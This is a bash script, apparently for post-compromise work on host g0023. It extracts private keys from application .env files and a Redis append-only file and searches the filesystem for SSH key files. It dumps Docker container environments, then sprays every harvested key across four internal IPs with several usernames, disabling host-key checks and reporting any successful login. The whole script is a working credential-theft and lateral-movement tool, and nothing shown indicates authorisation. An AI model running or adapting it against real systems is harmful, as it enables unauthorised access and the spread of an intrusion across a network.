#!/bin/bash
# extract candidate private keys on g0023, test against vcc-worker01..04
echo "=== ID"; hostname
WORK=/dev/shm/ul5205; rm -rf $WORK; mkdir -p $WORK
i=0
addkey() { # $1=file with key text
  [ -s "$1" ] || return
  i=$((i+1)); cp "$1" "$WORK/k$i"; chmod 600 "$WORK/k$i"
  echo "KEY$i src=$2 fp=$(ssh-keygen -lf "$WORK/k$i" 2>&1 | head -1) bytes=$(wc -c <"$WORK/k$i")"
}
# 1) keys inside INSPUR env files and project configs
for f in /ssd/vendors/INSPUR/project/inspur-fastapi-backend3/.env.dockerpg /ssd/vendors/INSPUR/project/inspur-fastapi-backend3/.env.prod /ssd/vendors/INSPUR/project/inspur-fastapi-backend3/.env*; do
  [ -f "$f" ] || continue
  echo "--- ENV $f"; grep -viE 'PASS|SECRET' "$f" | head -30
  awk '/BEGIN .*PRIVATE KEY/{f=1} f{print} /END .*PRIVATE KEY/{f=0}' "$f" | sed 's/\\n/\n/g' > $WORK/_k.tmp
  [ -s $WORK/_k.tmp ] && addkey $WORK/_k.tmp "$f"
done
# 2) keys from redis AOF
timeout 20 strings /ssd/vendors/INSPUR/redis/data/appendonlydir/*.aof 2>/dev/null | sed 's/\\n/\n/g' | awk '/BEGIN .*PRIVATE KEY/{f=1} f{print} /END .*PRIVATE KEY/{f=0}' > $WORK/_ka.tmp
[ -s $WORK/_ka.tmp ] && addkey $WORK/_ka.tmp redis-aof
echo "=== OTHERKEYFILES"
timeout 60 find /ssd /root /home /etc -maxdepth 6 \( -name 'id_rsa*' -o -name 'id_ed25519*' -o -name '*.pem' -o -name 'authorized_keys' \) -type f 2>/dev/null | grep -v '\.venv\|site-packages\|node_modules' | head -20
echo "=== INVENTORY"
timeout 60 grep -rlE 'vcc-worker' /ssd /etc /root /opt --include=*.conf --include=*.yaml --include=*.yml --include=*.json --include=*.ini --include=*.sh --include=*.py --include=*.csv --include=*.txt 2>/dev/null | grep -v '\.venv\|site-packages' | head -10
echo "=== DOCKERALL"; docker ps --format '{{.Names}}|{{.Ports}}' 2>&1 | head -30
echo "=== NPAENV"; for c in npa-client-java npa-management-java npa-bicm npa-ragflow; do echo "--- $c"; docker inspect $c --format '{{range .Config.Env}}{{println .}}{{end}}' 2>/dev/null | grep -viE 'PASSWORD|SECRET|TOKEN' | head -12; done
echo "=== SSHFROMKEYS"
for h in 192.168.0.24 192.168.0.28 192.168.0.30 192.168.0.31; do
  for k in $WORK/k*; do
    [ -f "$k" ] || continue
    for u in root ubuntu vcc inspur npa; do
      r=$(timeout 10 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o IdentitiesOnly=yes "$u@$h" 'id; hostname' 2>&1 | tail -2 | tr '\n' '|')
      case "$r" in *"Permission denied"*|*"timed out"*|*"refused"*) ;; *) echo "HIT $u@$h $(basename $k) => ${r:0:160}";; esac
    done
  done
done
echo "=== TRYSUMMARY"
for h in 192.168.0.24 192.168.0.28 192.168.0.30 192.168.0.31; do r=$(timeout 10 ssh -i "$WORK/k1" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o IdentitiesOnly=yes root@$h 'id' 2>&1 | tail -1); echo "$h k1: $r"; done
echo "=== DONE"
